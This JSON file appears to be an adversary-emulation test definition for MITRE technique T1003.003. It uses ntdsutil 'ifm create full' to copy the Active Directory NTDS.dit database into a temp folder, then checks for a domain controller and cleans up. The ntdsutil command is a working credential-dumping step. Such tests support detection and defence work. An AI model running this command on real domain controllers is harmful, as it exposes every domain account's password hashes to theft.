{
  "id": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
  "name": "Dump Active Directory Database with NTDSUtil",
  "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "628b353d-6c65-473e-894f-8475d824a519",
      "type": "execute-command",
      "data": {
        "command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "cd9cb90a-7738-440a-b70f-e3e548b50f8d",
      "type": "execute-command",
      "data": {
        "command": "rmdir /q /s #{output_folder} \u003enul 2\u003e\u00261",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "fcd0ecba-a8a1-47e3-8360-0b23c21eaaa0",
      "name": "Check dependency 1/1",
      "description": "Target must be a Domain Controller\n",
      "type": "execute-command",
      "data": {
        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "5edf1c92-9248-4321-a43f-7371276593c6",
      "name": "Resolve dependency 1/1",
      "description": "Target must be a Domain Controller\n",
      "type": "execute-command",
      "data": {
        "command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    },
    {
      "id": "a02d3a90-977b-4e5b-9ad2-5f52a2cdb877",
      "name": "Re-check dependency 1/1",
      "description": "Target must be a Domain Controller\n",
      "type": "execute-command",
      "data": {
        "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT",
        "command_type": "command_prompt"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "628b353d-6c65-473e-894f-8475d824a519",
      "p": "on-success",
      "o": "cd9cb90a-7738-440a-b70f-e3e548b50f8d"
    },
    {
      "s": "628b353d-6c65-473e-894f-8475d824a519",
      "p": "on-failure",
      "o": "cd9cb90a-7738-440a-b70f-e3e548b50f8d"
    },
    {
      "s": "fcd0ecba-a8a1-47e3-8360-0b23c21eaaa0",
      "p": "on-success",
      "o": "628b353d-6c65-473e-894f-8475d824a519"
    },
    {
      "s": "fcd0ecba-a8a1-47e3-8360-0b23c21eaaa0",
      "p": "on-failure",
      "o": "5edf1c92-9248-4321-a43f-7371276593c6"
    },
    {
      "s": "5edf1c92-9248-4321-a43f-7371276593c6",
      "p": "on-success",
      "o": "a02d3a90-977b-4e5b-9ad2-5f52a2cdb877"
    },
    {
      "s": "a02d3a90-977b-4e5b-9ad2-5f52a2cdb877",
      "p": "on-failure",
      "o": "628b353d-6c65-473e-894f-8475d824a519"
    }
  ],
  "tags": [
    "T1003",
    "T1003.003"
  ],
  "input_arguments": [
    {
      "name": "output_folder",
      "type": "path",
      "description": "Path where resulting dump should be placed",
      "value": "C:\\Windows\\Temp\\ntds_T1003"
    }
  ]
}